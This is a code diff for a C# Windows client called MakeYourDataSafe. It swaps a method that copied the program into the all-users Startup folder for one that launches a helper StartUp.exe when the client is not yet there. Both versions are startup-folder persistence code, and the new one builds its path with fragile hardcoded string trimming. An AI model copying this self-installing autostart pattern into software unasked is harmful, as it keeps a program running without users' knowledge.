@@ -29,8 +29,7 @@ namespace MakeYourDataSafe_Client
                 Directory.CreateDirectory(path);
             }
             timer1.Start();
-            //copyfile();
-            //;
+            checkAutoBoot();            
         }
 
         private void timer1_Tick(object sender, EventArgs e)
@@ -69,14 +68,17 @@ namespace MakeYourDataSafe_Client
             return 0;
         }
 
-        private void copyfile()
+        private void checkAutoBoot()
         {
-            string i = System.Reflection.Assembly.GetEntryAssembly().Location;
-            
-            Environment.CurrentDirectory = Environment.GetEnvironmentVariable("windir");
             DirectoryInfo info = new DirectoryInfo(".");
-            string o = info.Root + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"+ System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
-            File.Copy(i, o);
+            string o = info.Root + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\MakeYourDataSafe Client.exe";
+            string i = System.Reflection.Assembly.GetEntryAssembly().Location;
+            i = i.Substring(0, i.Length - 61) + ("StartUp\\bin\\Debug\\StartUp.exe");
+            if (File.Exists(o)==false)
+            {
+                Process.Start(i);
+            }
         }
+
     }
 }
